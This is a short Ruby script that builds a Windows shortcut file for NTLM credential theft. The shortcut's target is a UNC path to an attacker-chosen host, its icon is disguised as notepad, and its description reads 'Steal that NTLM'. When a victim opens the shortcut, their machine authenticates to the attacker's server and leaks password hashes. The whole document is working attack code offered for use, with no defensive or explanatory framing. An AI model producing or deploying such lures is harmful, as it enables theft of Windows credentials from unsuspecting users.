##################
# bad link
#  ./steal_ntlm 192.168.1.1 fakelink.lnk 
##################
require 'win32ole'

path    = ARGV[0] || 'localhost\pron.png'
sc_file = ARGV[1] || 'shortcut.lnk'

shell   = WIN32OLE.new('WScript.Shell')
link    = shell.CreateShortcut(sc_file)
link.TargetPath   = '\\\\' + path
link.Description  = "Steal that NTLM"
link.IconLocation = "notepad.exe"
link.WindowStyle  = 7
link.save
